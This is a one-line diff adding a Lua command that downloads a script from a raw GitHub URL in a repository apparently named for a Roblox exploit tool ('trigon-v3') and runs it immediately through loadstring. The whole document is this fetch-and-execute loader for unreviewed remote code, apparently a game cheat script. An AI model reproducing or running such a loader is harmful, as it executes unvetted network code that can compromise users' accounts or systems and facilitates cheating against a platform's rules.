@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/piltrue/trigon-v3/refs/heads/main/op%20style"))()
